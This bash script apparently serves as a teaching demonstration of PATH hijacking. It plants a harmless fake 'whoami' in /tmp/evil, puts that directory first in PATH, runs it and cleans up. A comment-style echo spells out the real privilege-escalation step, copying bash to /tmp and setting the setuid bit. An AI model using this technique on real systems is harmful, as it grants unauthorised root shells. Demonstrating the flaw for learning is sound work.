#!/bin/bash
# Demonstrates PATH hijacking through process privilege inheritance
# Safe — hijacks whoami, not a real system command
# Shows how child processes inherit parent privileges

echo "=== Creating fake whoami ==="
mkdir -p /tmp/evil
cat > /tmp/evil/whoami << 'FAKE'
#!/bin/bash
echo "PATH HIJACKED — running as: $(id)"
echo "In a real attack this would be: cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
FAKE
chmod +x /tmp/evil/whoami

echo ""
echo "=== Hijacking PATH ==="
export PATH=/tmp/evil:$PATH
echo "New PATH: $PATH"

echo ""
echo "=== Running whoami — which version runs? ==="
whoami

echo ""
echo "=== Cleanup ==="
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
rm -rf /tmp/evil
echo "PATH restored. Fake binary removed."
